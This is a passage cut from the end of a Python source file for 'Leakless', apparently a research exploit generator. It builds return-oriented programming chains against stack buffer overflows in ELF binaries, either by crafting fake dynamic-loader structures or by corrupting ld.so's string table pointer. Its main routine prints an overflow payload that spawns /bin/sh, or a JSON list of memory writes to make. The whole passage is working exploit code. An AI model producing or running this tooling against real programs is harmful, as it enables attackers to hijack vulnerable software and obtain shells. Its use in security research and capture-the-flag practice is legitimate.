                     self.ptr2str(exploit_info.reloc_index) + \
                     stack_frame

        else:
            raise Exception("Don't know how to launch the exploit")

        log(buffer.dump())

        return exploit

class ExecveCorruptLdSoExploit(ExecveExploit, CorruptLdSoExploit):
    pass

class ExecveCraftDlStructsExploit(ExecveExploit, CraftDlStructsExploit):
    pass

class RawDumperCorruptLdSoExploit(RawDumperExploit, CorruptLdSoExploit):
    pass

class RawDumperCraftDlStructsExploit(RawDumperExploit, CraftDlStructsExploit):
    pass

routing = {
    "json": {
        "ld-corrupt": RawDumperCorruptLdSoExploit,
        "craft-dl-structs": RawDumperCraftDlStructsExploit
    },
    "rop-chain": {
        "ld-corrupt": ExecveCorruptLdSoExploit,
        "craft-dl-structs": ExecveCraftDlStructsExploit
    }
}

def main():
    parser = argparse.ArgumentParser(description='Leakless')
    parser.add_argument('executable', metavar='EXECUTABLE', help='Path to the executable to exploit.', nargs=1)
    parser.add_argument("-o", '--output', metavar="TYPE", default="rop-chain", help='"rop-chain" will generate a ROP chain to exploit a stack based buffer overflow. "json" will output information about what needs to be written and where, along with the address of _dl_resolve_address and the index to pass it. Default is "rop-chain".')
    parser.add_argument("-m", "--method", metavar="METHOD", default="craft-dl-structs", help='"craft-dl-structs" will try to create all the structures necessary to invoke the dynamic loader in a writable memory address. "ld-corrupt" changes the pointer to DT_STRTAB ElfN_Dyn entry in an internal data structure of the loader and fakes a .dynstr table. Default is "craft-dl-structs".')
    parser.add_argument("-v", '--verbose', action='store_true', help="Print debug information.")
    parser.add_argument("-f", '--offset', metavar='OFFSET', type=int, help='Offset to overwrite the saved PC.')
    parser.add_argument("-l", '--library', metavar='LIBRARY', type=int, default=0, help='When using the "ld-corrupt" method, use the LIBRARY-th dependency to obtain the dl_resolve pointer. Use `ldd` to get the order of the libraries. By default is 0.')
    args = parser.parse_args()

    executable_path = args.executable[0]

    # TODO: make something more graceful
    if not args.verbose:
        sys.stderr = open(os.devnull, 'w')

    exploit = routing[args.output][args.method]()
    exploit.config_from_elf(executable_path)
    exploit.library_index = args.library

    if args.output == "json":
        buffer = Buffer(exploit, exploit.writeable_ranges)
        exploit_info = exploit.jump_to(buffer, "execve")

        what_to_write = []

        for type, value, address, offset in exploit_info.prepare:
            if type == "write_constant":
                address = hex(exploit.str2ptr(address))
            elif type == "write_with_offset":
                address = {"deref": hex(exploit.str2ptr(address)), "offset": hex(exploit.str2ptr(offset))}
            elif type == "deref_with_offset_and_save":
                address = {"deref": hex(exploit.str2ptr(address)), "offset": hex(exploit.str2ptr(offset))}

            what_to_write.append({"address": address, "value": value.encode("hex")})

        result = {"write": what_to_write, "reloc_index": exploit_info.reloc_index}

        if exploit_info.plt0 is not None:
            result["plt0"] = hex(exploit_info.plt0)
        else:
            result["l_struct"] = hex(exploit_info.l_struct)
            result["dl_resolve"] = hex(exploit_info.dl_resolve)

        sys.stdout.write(json.dumps(result, indent=4, sort_keys=True) + "\n")
        return
    else:
        if args.offset is None:
            log("Please give me the offset to reach the saved PC.")
            sys.exit(-1)

        sys.stdout.write("A" * args.offset + exploit.launch("/bin/sh"))

if __name__ == "__main__":
    main()
